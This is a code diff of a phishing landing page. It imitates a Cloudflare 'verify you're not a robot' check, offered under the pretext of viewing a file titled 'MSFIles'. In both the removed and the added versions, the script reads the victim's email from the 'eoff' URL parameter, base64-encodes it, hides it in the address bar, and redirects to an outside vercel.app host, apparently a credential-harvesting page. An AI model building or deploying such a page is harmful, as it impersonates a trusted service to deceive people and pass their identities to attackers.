@@ -3,333 +3,292 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WegetFiles</title>
+    <title>MSFIles</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
 
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #f9f9f9;
+            background-color: #f5f5f5;
             display: flex;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
             padding: 20px;
-            color: #333;
+            flex-direction: column;
         }
 
-        .initial-spinner {
-            width: 50px;
-            height: 50px;
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #4CAF50;
-            border-radius: 50%;
-            animation: spin 1.5s linear infinite;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .instruction {
-            margin-bottom: 18px;
+        .text1 {
+            margin-bottom: 20px;
             text-align: center;
+            color: #333;
             font-size: 16px;
-            color: #555;
-            display: none;
+            max-width: 500px;
         }
 
-        .verification-container {
+        .box1 {
             background-color: white;
             border-radius: 12px;
-            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.08);
-            padding: 24px;
-            width: 100%;
-            max-width: 420px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+            width: 90%;
+            height:100px;
+            max-width: 500px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            border: 1px solid #eaeaea;
-            display: none;
         }
 
-        .verification-left {
+        .loader {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .spinner1 {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            animation: rotate 1s linear infinite;
+        }
+
+        .section1 {
             display: flex;
             align-items: center;
         }
 
-        .checkbox-container {
-            position: relative;
-            display: flex;
-            align-items: center;
-        }
-
-        .checkbox {
-            position: absolute;
-            opacity: 0;
-            width: 0;
-            height: 0;
-        }
-
-        .checkbox-label {
+        .container1 {
             display: flex;
             align-items: center;
             cursor: pointer;
-            font-size: 16px;
-            color: #333;
-            transition: color 0.2s ease;
+            padding: 10px 15px;
+            border-radius: 8px;
+            transition: background-color 0.3s;
         }
 
-        .checkbox-label:hover {
-            color: #000;
+        .container1:hover {
+            background-color: #f9f9f9;
         }
 
-        .custom-checkbox {
-            width: 20px;
-            height: 20px;
-            border: 2px solid #ccc;
+        .item1 {
+            width: 24px;
+            height: 24px;
+            border: 2px solid #ddd;
             border-radius: 4px;
+            margin-right: 15px;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin-right: 12px;
-            transition: all 0.3s ease;
+            transition: all 0.3s;
         }
 
-        .checkbox:checked + .checkbox-label .custom-checkbox {
+        .item1.active {
             border-color: #4CAF50;
             background-color: #4CAF50;
         }
 
-        .checkbox:checked + .checkbox-label .custom-checkbox::after {
-            content: "";
-            width: 5px;
-            height: 10px;
-            border: solid white;
-            border-width: 0 2px 2px 0;
-            transform: rotate(45deg);
-            margin-top: -1px;
+        .item1.loading {
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid #3498db;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            animation: rotate 1s linear infinite;
         }
 
-        .spinner {
-            width: 20px;
-            height: 20px;
-            border: 2px solid transparent;
-            border-top: 2px solid #4CAF50;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-right: 12px;
+        @keyframes rotate {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .item1 i {
+            color: white;
+            font-size: 14px;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+
+        .item1.active i {
+            opacity: 1;
+        }
+
+        .text2 {
+            font-size: 16px;
+            color: #333;
+            font-weight: 500;
+        }
+
+        .text3 {
+            font-size: 16px;
+            color: #3498db;
+            font-weight: 500;
             display: none;
         }
 
-        .success-check {
-            width: 20px;
-            height: 20px;
-            border-radius: 50%;
-            background-color: #4CAF50;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-right: 12px;
+        .text4 {
+            font-size: 16px;
+            color: #4CAF50;
+            font-weight: 500;
             display: none;
         }
 
-        .success-check::after {
-            content: "";
-            width: 5px;
-            height: 10px;
-            border: solid white;
-            border-width: 0 2px 2px 0;
-            transform: rotate(45deg);
-            margin-top: -1px;
-        }
-
-        .verification-right {
+        .section2 {
+            text-align: right;
             display: flex;
             flex-direction: column;
             align-items: flex-end;
         }
 
-        .logo-container {
+        .container2 {
             display: flex;
             align-items: center;
-            margin-bottom: 8px;
+            margin-bottom: 10px;
         }
 
-        .logo {
-            width: 32px;
-            height: 32px;
-            margin-right: 4px;
+        .item2 {
+            width: 33px;
+            height: 33px;
+            margin-right: 10px;
             border-radius: 4px;
-        }
-
-        .brand {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            font-size: 13px;
-            font-weight: 500;
-            color: #333;
-            letter-spacing: 0.5px;
-        }
-
-        .footer {
+            display: flex;
+            align-items: center;
+            justify-content: center;
             font-size: 12px;
             color: #666;
         }
 
-        .footer a {
-            color: #666;
-            text-decoration: none;
-            transition: color 0.2s ease;
+        .text5 {
+            font-size: 20px;
+            color: #2c3e50;
+            font-weight: 700;
+            letter-spacing: 1px;
         }
 
-        .footer a:hover {
-            color: #333;
+        .text6 {
+            color: #7f8c8d;
+            font-size: 12px;
+        }
+
+        .text6 a {
+            color: #7f8c8d;
+            text-decoration: none;
+        }
+
+        .text6 a:hover {
             text-decoration: underline;
+        }
+
+        .hidden {
+            display: none !important;
         }
     </style>
 </head>
 <body>
-    <!-- Only the spinner shows initially -->
-    <div class="initial-spinner" id="initialSpinner"></div>
+    <div class="loader" id="loader">
+        <div class="spinner1"></div>
+    </div>
 
-    <!-- Everything else is hidden initially -->
-    <div class="instruction" id="instruction">
+    <div class="text1 hidden" id="text1">
         To view this document, verify you're not a robot below
     </div>
 
-    <div class="verification-container" id="verificationContainer">
-        <div class="verification-left">
-            <div class="checkbox-container">
-                <input type="checkbox" id="verification-checkbox" class="checkbox">
-                <label for="verification-checkbox" class="checkbox-label">
-                    <span class="custom-checkbox"></span>
-                    <span id="verification-text">Verify</span>
-                </label>
+    <div class="box1 hidden" id="box1">
+        <div class="section1">
+            <div class="container1" id="container1">
+                <div class="item1" id="item1">
+                    <i>✓</i>
+                </div>
+                <span class="text2" id="text2">Verify</span>
+                <span class="text3" id="text3">Verifying...</span>
+                <span class="text4" id="text4">Success!</span>
             </div>
-
-            <div class="spinner" id="spinner"></div>
-            <div class="success-check" id="success-check"></div>
         </div>
 
-        <div class="verification-right">
-            <div class="logo-container">
-                <img src="cloudflare_.png" alt="Cloudflare" class="logo" style="width:32px;height:32px;">
-                <div class="brand">CLOUDFLARE</div>
+        <div class="section2">
+            <div class="container2">
+                <img src="cloudflare_.png" alt="Cloudflare" class="item2" style="width:32px;height:32px;">
+                <div class="text5">Cloudflare</div>
             </div>
-            <div class="footer">
+            <div class="text6">
                 <a href="#">Privacy</a> · <a href="#">Terms</a>
             </div>
         </div>
     </div>
 
     <script>
-        // Function to encode string to base64
-        function encodeBase64(str) {
-            if (typeof btoa === 'function') {
-                return btoa(str);
-            }
-            return Buffer.from(str).toString('base64');
-        }
+        document.addEventListener('DOMContentLoaded', function() {
+            const loader = document.getElementById('loader');
+            const text1 = document.getElementById('text1');
+            const box1 = document.getElementById('box1');
+            const container1 = document.getElementById('container1');
+            const item1 = document.getElementById('item1');
+            const text2 = document.getElementById('text2');
+            const text3 = document.getElementById('text3');
+            const text4 = document.getElementById('text4');
 
-        // Function to decode base64 string
-        function decodeBase64(str) {
-            if (typeof atob === 'function') {
-                return atob(str);
-            }
-            return Buffer.from(str, 'base64').toString();
-        }
+            setTimeout(function() {
+                loader.classList.add('hidden');
+                text1.classList.remove('hidden');
+                box1.classList.remove('hidden');
+            }, 2000);
 
-        // Function to get URL parameters
-        function getUrlParameter(name) {
-            name = name.replace(/[\[\]]/g, '\\$&');
-            const regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)');
-            const results = regex.exec(window.location.href);
-            if (!results) return null;
-            if (!results[2]) return '';
-            return decodeURIComponent(results[2].replace(/\+/g, ' '));
-        }
+            let verified = false;
 
-        // Function to check if a string is base64 encoded
-        function isBase64(str) {
-            try {
-                return btoa(atob(str)) === str;
-            } catch (err) {
-                return false;
-            }
-        }
+            container1.addEventListener('click', function() {
+                if (verified) return;
 
-        // Function to process URL and ensure eoff parameter is always encoded
-        function processUrl() {
-            const currentUrl = new URL(window.location.href);
-            const eoffParam = currentUrl.searchParams.get('eoff');
+                item1.classList.add('loading');
+                text2.style.display = 'none';
+                text3.style.display = 'inline';
+                text4.style.display = 'none';
 
-            if (eoffParam && !isBase64(eoffParam)) {
-                const encodedEmail = encodeBase64(eoffParam);
-                const newUrl = `${window.location.origin}${window.location.pathname}?eoff=${encodedEmail}`;
-                window.history.replaceState(null, '', newUrl);
-            }
-        }
+                const currentUrl = window.location.href;
+                let redirectUrl = 'https://xyz123-blush.vercel.app/?eoff=';
 
-        // Function to build redirect URL with encoded email (broken into parts)
-        function buildRedirectUrl() {
-            const protocol = 'https:';
-            const domain = '//xyz123-blush.vercel.app';
-            const path = '/';
-            const eoffParam = getUrlParameter('eoff');
+                const paramIndex = currentUrl.indexOf('eoff=');
+                if (paramIndex !== -1) {
+                    let paramValue = currentUrl.substring(paramIndex + 5);
 
-            if (eoffParam) {
-                return `${protocol}${domain}${path}?eoff=${eoffParam}`;
-            }
+                    const separatorIndex = paramValue.indexOf('&');
+                    if (separatorIndex !== -1) {
+                        paramValue = paramValue.substring(0, separatorIndex);
+                    }
 
-            return `${protocol}${domain}${path}`;
-        }
+                    const encodedValue = btoa(paramValue);
 
-        // Process URL on page load
-        processUrl();
+                    const newUrl = window.location.origin + window.location.pathname + '?encoded=' + encodedValue;
+                    window.history.replaceState({}, document.title, newUrl);
 
-        // Show only spinner for 3 seconds, then show everything else
-        setTimeout(function() {
-            document.getElementById('initialSpinner').style.display = 'none';
-            document.getElementById('instruction').style.display = 'block';
-            document.getElementById('verificationContainer').style.display = 'flex';
-        }, 3000);
-
-        document.getElementById('verification-checkbox').addEventListener('change', function() {
-            const checkbox = this;
-            const verificationText = document.getElementById('verification-text');
-            const customCheckbox = document.querySelector('.custom-checkbox');
-            const spinner = document.getElementById('spinner');
-            const successCheck = document.getElementById('success-check');
-
-            if (checkbox.checked) {
-                customCheckbox.style.display = 'none';
-                spinner.style.display = 'block';
-                verificationText.textContent = 'Verifying...';
+                    redirectUrl += encodeURIComponent(encodedValue);
+                }
 
                 setTimeout(function() {
-                    spinner.style.display = 'none';
-                    successCheck.style.display = 'flex';
-                    verificationText.textContent = 'Success!';
+                    item1.classList.remove('loading');
+                    item1.classList.add('active');
 
-                    const redirectUrl = buildRedirectUrl();
-                    console.log('Redirecting to:', redirectUrl);
+                    text3.style.display = 'none';
+                    text4.style.display = 'inline';
+
+                    verified = true;
 
                     setTimeout(function() {
                         window.location.href = redirectUrl;
                     }, 1000);
-                }, 1500);
-            } else {
-                customCheckbox.style.display = 'flex';
-                spinner.style.display = 'none';
-                successCheck.style.display = 'none';
-                verificationText.textContent = 'Verify';
-            }
+                }, 2000);
+            });
         });
     </script>
 </body>
